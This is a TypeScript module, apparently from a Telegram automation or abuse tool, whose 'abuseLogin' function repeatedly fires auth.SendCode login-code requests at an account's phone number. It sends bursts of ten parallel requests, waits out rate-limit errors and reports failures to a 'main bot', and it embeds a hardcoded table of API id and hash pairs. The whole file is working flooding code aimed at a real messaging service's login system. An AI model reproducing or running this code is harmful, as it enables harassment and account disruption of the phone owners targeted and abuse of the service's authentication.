import { initClient } from '../_client';
import GramJs from '../../gramjs/tl/api';
import { getAccountById } from '../db/accounts';
import { sleep } from '../helpers/helpers';
import { sendToMainBot } from '../helpers/sendToMainBot';
import { invokeRequest } from './invokeRequest';

export const activeCodeRequests: Record<string, boolean> = {};

export const isCodeRequestActive = (accountId: string): boolean =>
  activeCodeRequests[accountId];
export const setCodeRequestActive = (
  accountId: string,
  active: boolean
): void => {
  activeCodeRequests[accountId] = active;
};

const API_PAIRS: Record<number, string> = {
  4: '014b35b6184100b085b0d0572f9b5103',
  5: '1c5c96d5edd401b1ed40db3fb5633e2d',
  6: 'eb06d4abfb49dc3eeb1aeb98ae0f581e',
  8: '7245de8e747a0d6fbe11f7cc14fcc0bb',
  9: '3975f648bb682ee889f35483bc618d1c',
  2040: 'b18441a1ff607e10a989891a5462e627',
  2496: '8da85b0d5bfe62527e5b244c209159c3',
  2834: '68875f756c9b437a8b916ca3de215815',
  2899: '36722c72256a24c1225de00eb6a1ca74',
  10840: '33c45224029d59cb3ad0c16134215aeb',
  16623: '8c9dbfe58437d1739540f5d53c72ae4b',
  17349: '344583e45741c457fe1862106095a5eb',
  21724: '3e0cb5efcd52300aec5994fdfc5bdc16',
  94575: 'a3406de8d171bb422bb6ddf3bbd800e2',
  611335: 'd524b414d21f4d37f08684c1df41ac9c',
};

async function sendCodeRequest(
  dcId: number,
  accountId: string,
  apiId: number,
  apiHash: string,
  phoneNumber: string
) {
  setCodeRequestActive(accountId, true);

  const client = await initClient(
    {
      dcId,
      nextApiId: apiId,
      accountId: `${accountId}-abuse-login`,
    },
    () => {},
    (e) => sendToMainBot(e),
    true
  );

  try {
    await invokeRequest(
      client,
      new GramJs.auth.SendCode({
        phoneNumber,
        apiId,
        apiHash,
        settings: new GramJs.CodeSettings(),
      })
    );

    await client.destroy();
    return false;
  } catch (error: any) {
    await client.destroy();

    return error;
  }
}

export const abuseLogin = async (accountId: string) => {
  const { dcId, nextApiId, phone } = await getAccountById(accountId);

  if (!phone || !nextApiId) {
    return;
  }

  const apiHash = API_PAIRS[nextApiId];

  if (!apiHash) {
    await sendToMainBot(`💀 API_HASH_NOT_FOUND 💀
ID: ${accountId}
API_ID: ${nextApiId}`);
    return;
  }

  while (true) {
    try {
      const loginError = await sendCodeRequest(
        dcId,
        accountId,
        nextApiId,
        apiHash,
        phone
      );

      if (!loginError) {
        const requests = Array(10)
          .fill(null)
          .map(() =>
            sendCodeRequest(dcId, accountId, nextApiId, apiHash, phone)
          );

        await Promise.all(requests);
        continue;
      }

      setCodeRequestActive(accountId, false);

      const reason = loginError.message;
      if (reason.includes('seconds is required (caused by auth.SendCode)')) {
        const secondsMatch = reason.match(/\d+/);

        if (secondsMatch) {
          const seconds = parseInt(secondsMatch[0], 10);

          if (seconds > 3600) {
            return;
          }

          await sleep(seconds * 1000);
        }
      } else {
        await sendToMainBot(`💀 ABUSE_LOGIN_ERROR 💀
ID: ${accountId}
REASON: ${reason}`);
        return;
      }
    } catch (error: any) {
      setCodeRequestActive(accountId, false);
      await sendToMainBot(`💀 ABUSE_LOGIN_GLOBAL_ERROR 💀
ID: ${accountId}
REASON: ${error.message}`);
      return;
    }
  }
};
